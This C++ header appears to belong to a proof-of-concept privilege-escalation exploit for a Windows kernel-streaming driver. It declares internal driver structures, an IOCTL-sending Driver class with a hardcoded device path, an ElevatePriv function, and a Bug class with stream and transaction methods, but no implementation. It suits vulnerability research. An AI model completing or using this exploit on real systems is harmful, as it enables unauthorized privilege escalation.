#pragma once

#ifndef _POC_H
#define _POC_H

#include <windows.h>

#include <iostream>
#include <string>

#include "common/utils.h"

namespace poc {

struct _FSStreamRegInfo {
    int64_t q1;
    int64_t q2;
    int64_t q3;
    int q4;
    unsigned int f2;
    unsigned int q5;
    int f1;
    HANDLE ObjectHandle;
};

struct FSMemoryStream {
    int64_t q0;
    int64_t q1;
    int64_t q2;
    int64_t g1;
    PVOID VirtualAddress2;
    int64_t q5;
    int q6;
    int VirtualAddressLength2;
    PVOID VirtualAddress1;
    int q8;
    int VirtualAddressLength1;
    uint64_t switch_case;
    int64_t q10;
    int64_t q11;
    int64_t q12;
    int64_t q13;
    int64_t q14;
    int64_t q15;
    int64_t q16;
};

struct FSFrameInfo {
    int64_t q1;
    int64_t q2;
    int64_t q3;
    int64_t q4;
    int ArrayCounter;
    int h1;
    struct FSMemoryStream FSMemoryStreamArray;
};
void ElevatePriv();
bool once = true;
utils::utilities utils_;

class Driver {
public:
    bool SendDataToDriver(int ioctl_code,
                          PVOID buffer,
                          size_t buffer_len,
                          PVOID OutBuffer = nullptr,
                          size_t out_buffer_len = -1);
    bool ConnectToMskSSRVPort();

private:
    LPCWSTR lpFileName =
        L"\\\\?\\ROOT#SYSTEM#0000#{3c0d501a-140b-11d1-b40f-00a0c9223196}\\{96E080C7-143C-11D1-B40F-"
        L"00A0C9223196}&{3C0D501A-140B-11D1-B40F-00A0C9223196}";
    HANDLE hDevice = nullptr;
};

class Bug {
public:
    bool Start();
    bool InitializeDriverHandles();
    bool RegisterStream();
    bool PublishTx(uint64_t addr);
    bool ConsumeTx();
    bool DrainTx();
    uint64_t GetMappedAddr() { return user_mapped_addr_; }
    bool InitializeStream();
    bool InitializeGlobalRendezvous();

private:
    uint64_t kBaseAddr = 0x00;
    Driver driver1_;
    Driver driver2_;
    uint64_t user_mapped_addr_ = 0x00;
};

}  // namespace poc

#endif
